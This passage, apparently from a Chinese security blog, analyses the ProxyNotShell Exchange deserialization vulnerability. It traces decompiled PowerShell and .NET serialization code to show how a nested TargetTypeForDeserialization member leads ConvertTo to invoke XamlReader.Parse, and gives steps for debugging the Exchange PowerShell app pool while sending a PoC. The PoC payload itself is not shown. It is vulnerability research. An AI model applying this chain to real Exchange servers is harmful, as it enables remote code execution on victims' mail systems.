</span></span><span style=display:flex><span>				<span style=color:#66d9ef>object</span>[] callA = <span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>object</span>[];
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.binaryMethodCall.ReadArray(callA, <span style=color:#66d9ef>this</span>.handlerObject);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bMethodReturn)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>object</span>[] returnA = <span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>object</span>[];
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage, <span style=color:#66d9ef>this</span>.handlerObject);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.TopObject;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/1.png></p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/2.png></p><p>在一系列函数调用返回后，<em><code>System.Management.Automation.InternalDeserializer.ReadProperties</code><em>会将</em><code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize</code><em>返回的对象添加到</em><code>PSObject.adaptedMembers</code><em>中，需要注意的是该对象变量名为</em><code>TargetTypeForDeserialization</code></em>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> ReadProperties(PSObject dso)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			dso.isDeserialized = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>			dso.adaptedMembers = <span style=color:#66d9ef>new</span> PSMemberInfoInternalCollection&lt;PSPropertyInfo&gt;();
</span></span><span style=display:flex><span>			dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod&lt;PSMemberInfo&gt;(dso, <span style=color:#e6db74>&#34;GetType&#34;</span>));
</span></span><span style=display:flex><span>			PSGetMemberBinder.SetHasInstanceMember(<span style=color:#e6db74>&#34;GetType&#34;</span>);
</span></span><span style=display:flex><span>			dso.clrMembers = <span style=color:#66d9ef>new</span> PSMemberInfoInternalCollection&lt;PSPropertyInfo&gt;();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.ReadStartElementAndHandleEmpty(<span style=color:#e6db74>&#34;Props&#34;</span>))
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>this</span>._reader.NodeType == XmlNodeType.Element)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>string</span> name = <span style=color:#66d9ef>this</span>.ReadNameAttribute();
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>object</span> serializedValue = <span style=color:#66d9ef>this</span>.ReadOneObject();
</span></span><span style=display:flex><span>					PSProperty member = <span style=color:#66d9ef>new</span> PSProperty(name, serializedValue);
</span></span><span style=display:flex><span>					dso.adaptedMembers.Add(member);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ReadEndElement();
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>在反序列化外层对象时，<code>ReadOneObject</code>会调用<code>GetTargetTypeForDeserialization</code>获取反序列化的目标类型，并通过<code>ConvertTo</code>转化为该对象。</p><p>在<code>GetTargetTypeForDeserialization</code>函数中，将会调用<code>GetPSStandardMember</code>并传入硬编码的<code>TargetTypeForDeserialization</code>，在<code>GetPSStandardMember</code>中会通过<code>TypeTableGetMemberDelegate</code>创建成员集合，其中包括子类的成员属性，而后匹配其中的<code>memberName</code>项对应的值并返回。此时获取的值为<code>XamlReader</code>类型的Type对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			PSMemberInfo psstandardMember = <span style=color:#66d9ef>this</span>.GetPSStandardMember(backupTypeTable, <span style=color:#e6db74>&#34;TargetTypeForDeserialization&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (psstandardMember != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> psstandardMember.Value <span style=color:#66d9ef>as</span> Type;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>internal</span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, <span style=color:#66d9ef>string</span> memberName)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			PSMemberInfo psmemberInfo = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>			TypeTable typeTable = (backupTypeTable != <span style=color:#66d9ef>null</span>) ? backupTypeTable : <span style=color:#66d9ef>this</span>.GetTypeTable();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (typeTable != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&lt;PSMemberSet&gt;(<span style=color:#66d9ef>this</span>, typeTable, <span style=color:#e6db74>&#34;PSStandardMembers&#34;</span>);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (psmemberSet != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					psmemberSet.ReplicateInstance(<span style=color:#66d9ef>this</span>);
</span></span><span style=display:flex><span>					psmemberInfo = <span style=color:#66d9ef>new</span> PSMemberInfoIntegratingCollection&lt;PSMemberInfo&gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (psmemberInfo == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				psmemberInfo = (<span style=color:#66d9ef>this</span>.InstanceMembers[<span style=color:#e6db74>&#34;PSStandardMembers&#34;</span>] <span style=color:#66d9ef>as</span> PSMemberSet);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> psmemberInfo;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>外层类类型定义为<code>System.ServiceProcess.ServiceController</code>，其定义在types.ps1xml文件内，定义如下。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;Type&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;Name&gt;</span>System.ServiceProcess.ServiceController<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;Members&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;MemberSet&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Name&gt;</span>PSStandardMembers<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Members&gt;</span>
</span></span><span style=display:flex><span>          <span style=color:#f92672>&lt;PropertySet&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Name&gt;</span>DefaultDisplayPropertySet<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;ReferencedProperties&gt;</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>&lt;Name&gt;</span>Status<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>&lt;Name&gt;</span>Name<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>&lt;Name&gt;</span>DisplayName<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;/ReferencedProperties&gt;</span>
</span></span><span style=display:flex><span>          <span style=color:#f92672>&lt;/PropertySet&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/Members&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/MemberSet&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;AliasProperty&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Name&gt;</span>Name<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;ReferencedMemberName&gt;</span>ServiceName<span style=color:#f92672>&lt;/ReferencedMemberName&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/AliasProperty&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;AliasProperty&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Name&gt;</span>RequiredServices<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;ReferencedMemberName&gt;</span>ServicesDependedOn<span style=color:#f92672>&lt;/ReferencedMemberName&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/AliasProperty&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;ScriptMethod&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Name&gt;</span>ToString<span style=color:#f92672>&lt;/Name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Script&gt;</span>
</span></span><span style=display:flex><span>          $this.ServiceName
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/Script&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/ScriptMethod&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/Members&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/Type&gt;</span>
</span></span></code></pre></div><p>在<code>GetPSStandardMember</code>函数会试图获取System.ServiceProcess.ServiceController类的<code>TargetTypeForDeserialization</code>（传入的硬编码参数）属性，但其在文件内没有定义默认的<code>TargetTypeForDeserialization</code>值，所以外层类的<code>members</code>内没有<code>TargetTypeForDeserialization</code>名字的值，Exchange将试图从子类的<code>members</code>属性中检索<code>TargetTypeForDeserialization</code>名字的值，前面说过在对内层对象反序列化时，通过<code>ReadProperties</code>将名为<code>TargetTypeForDeserialization</code>的<code>XamlReader</code>类型的Type对象添加到了<code>adaptedMembers</code>中，此时<code>Exchange</code>将会检索到该对象并返回。</p><p>获取到<code>targetTypeForDeserialization</code>之后，<code>ReadOneObject</code>调用<code>LanguagePrimitives.ConvertTo</code>将序列化数据转换为<code>targetTypeForDeserialization(XamlReader)</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>object</span> ReadOneObject(<span style=color:#66d9ef>out</span> <span style=color:#66d9ef>string</span> streamName)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			....
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>object</span> obj = <span style=color:#66d9ef>this</span>.ReadOneDeserializedObject(<span style=color:#66d9ef>out</span> streamName, <span style=color:#66d9ef>out</span> flag);
</span></span><span style=display:flex><span>	.....
</span></span><span style=display:flex><span>						Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(<span style=color:#66d9ef>this</span>._typeTable);
</span></span><span style=display:flex><span>....
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>object</span> obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, <span style=color:#66d9ef>true</span>, CultureInfo.InvariantCulture, <span style=color:#66d9ef>this</span>._typeTable);
</span></span><span style=display:flex><span>	.....
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/3.png></p><h3 id=调试>调试</h3><p>使用dnsPy附加到下面的进程</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>c:\windows\system32\inetsrv\w3wp.exe -ap
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;MSExchangePowerShellAppPool&#34;</span> -v <span style=color:#e6db74>&#34;v4.0&#34;</span> -c
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config&#34;</span>
</span></span><span style=display:flex><span>-a \\.\pipe\iisipm319caf0c-5de0-<span style=color:#ae81ff>4833</span>-8a04-4b28f4a836ae
</span></span><span style=display:flex><span>-h <span style=color:#e6db74>&#34;C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config&#34;</span>
</span></span><span style=display:flex><span>-w <span style=color:#e6db74>&#34;&#34;</span> -m <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>在以下几个地方下断点</p><ul><li>System.Runtime.Serialization.Formatters.Binary<ul><li>ObjectReader.Deserialize</li></ul></li></ul><p>发送PoC，调试器在断点处断下，此时调用栈如下:</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/4.png></p><p>此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>object</span> Deserialize(HeaderHandler handler, __BinaryParser serParser, <span style=color:#66d9ef>bool</span> fCheck, <span style=color:#66d9ef>bool</span> isCrossAppDomain, IMethodCallMessage methodCallMessage)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span>			serParser.Run();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bFullDeserialization)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.m_objectManager.DoFixups();
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (!<span style=color:#66d9ef>this</span>.bMethodCall &amp;&amp; !<span style=color:#66d9ef>this</span>.bMethodReturn)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.TopObject == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SerializationException(Environment.GetResourceString(<span style=color:#e6db74>&#34;Serialization_TopObject&#34;</span>));
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.HasSurrogate(<span style=color:#66d9ef>this</span>.TopObject.GetType()) &amp;&amp; <span style=color:#66d9ef>this</span>.topId != <span style=color:#ae81ff>0L</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.m_objectManager.GetObject(<span style=color:#66d9ef>this</span>.topId);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>is</span> IObjectReference)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>this</span>.TopObject = ((IObjectReference)<span style=color:#66d9ef>this</span>.TopObject).GetRealObject(<span style=color:#66d9ef>this</span>.m_context);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bFullDeserialization)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.m_objectManager.RaiseDeserializationEvent();
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (handler != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.handlerObject = handler(<span style=color:#66d9ef>this</span>.headers);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bMethodCall)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>object</span>[] callA = <span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>object</span>[];
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.binaryMethodCall.ReadArray(callA, <span style=color:#66d9ef>this</span>.handlerObject);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bMethodReturn)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>object</span>[] returnA = <span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>object</span>[];
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage, <span style=color:#66d9ef>this</span>.handlerObject);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.TopObject;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>serParser.Run()会将内存序列化数据试图转化为<em>System.UnitySerializationHolder</em> 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出<em>System.UnitySerializationHolder</em>对象并载入<em>System.UnitySerializationHolder.AssemblyName</em>对应的DLL。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>void</span> Run()
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>bool</span> flag = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ReadBegin();
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ReadSerializationHeaderRecord();
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>while</span> (flag)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object;
</span></span><span style=display:flex><span>					BinaryTypeEnum binaryTypeEnum = <span style=color:#66d9ef>this</span>.expectedType;
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> (binaryTypeEnum != BinaryTypeEnum.Primitive)
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>if</span> (binaryTypeEnum - BinaryTypeEnum.String &gt; <span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>						{
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SerializationException(Environment.GetResourceString(<span style=color:#e6db74>&#34;Serialization_TypeExpected&#34;</span>));
</span></span><span style=display:flex><span>						}
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>byte</span> b = <span style=color:#66d9ef>this</span>.dataReader.ReadByte();
</span></span><span style=display:flex><span>						binaryHeaderEnum = (BinaryHeaderEnum)b;
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>switch</span> (binaryHeaderEnum)
</span></span><span style=display:flex><span>						{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> BinaryHeaderEnum.Object:
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>this</span>.ReadObject();
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> BinaryHeaderEnum.ObjectWithMap:
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span><span style=color:#66d9ef>this</span>.ReadObjectWithMap(binaryHeaderEnum);
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> BinaryHeaderEnum.ObjectWithMapTyped:
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>this</span>.ReadObjectWithMapTyped(binaryHeaderEnum);
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> BinaryHeaderEnum.ObjectString:
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>this</span>.ReadObjectString(binaryHeaderEnum);
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> BinaryHea......flag2)
</span></span><span style=display:flex><span>						{
</span></span><span style=display:flex><span>							ObjectProgress objectProgress = (ObjectProgress)<span style=color:#66d9ef>this</span>.stack.Peek();
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>if</span> (objectProgress == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>							{
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>this</span>.expectedType = BinaryTypeEnum.ObjectUrt;
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>this</span>.expectedTypeInformation = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>								flag2 = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>							}
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>							{
</span></span><span style=display:flex><span>								flag2 = objectProgress.GetNext(<span style=color:#66d9ef>out</span> objectProgress.expectedType, <span style=color:#66d9ef>out</span> objectProgress.expectedTypeInformation);
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>this</span>.expectedType = objectProgress.expectedType;
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>this</span>.expectedTypeInformation = objectProgress.expectedTypeInformation;
</span></span><span style=display:flex><span>								<span style=color:#66d9ef>if</span> (!flag2)
</span></span><span style=display:flex><span>								{
</span></span><span style=display:flex><span>									<span style=color:#66d9ef>this</span>.prs.Init();
</span></span><span style=display:flex><span>									<span style=color:#66d9ef>if</span> (objectProgress.memberValueEnum == InternalMemberValueE.Nested)
</span></span><span style=display:flex><span>									{
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.objectReader.Parse(<span style=color:#66d9ef>this</span>.prs);
</span></span><span style=display:flex><span>									}
</span></span><span style=display:flex><span>									<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>									{
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;
</span></span><span style=display:flex><span>										<span style=color:#66d9ef>this</span>.objectReader.Parse(<span style=color:#66d9ef>this</span>.prs);
</span></span><span style=display:flex><span>									}
</span></span><span style=display:flex><span>									<span style=color:#66d9ef>this</span>.stack.Pop();
</span></span><span style=display:flex><span>									<span style=color:#66d9ef>this</span>.PutOp(objectProgress);
</span></span><span style=display:flex><span>								}
</span></span><span style=display:flex><span>							}
</span></span><span style=display:flex><span>						}
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/5.png></p><p>将XamlReader读入内存</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/6.png></p><p>在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过</p><p><code>this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context);</code> 将<em>System.UnitySerializationHolder</em>转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/7.png></p><p>在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/8.png></p><p>注：Type类型是Exchange内定义的抽象类，如下所示：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>namespace</span> System
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#75715e>// Token: 0x02000148 RID: 328</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[ClassInterface(ClassInterfaceType.None)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[ComDefaultInterface(typeof(_Type))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[ComVisible(true)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[__DynamicallyInvokable]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[Serializable]</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>abstract</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Type</span> : MemberInfo, _Type, IReflect
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#75715e>// Token: 0x17000217 RID: 535</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>override</span> MemberTypes MemberType
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>get</span>
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> MemberTypes.TypeInfo;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
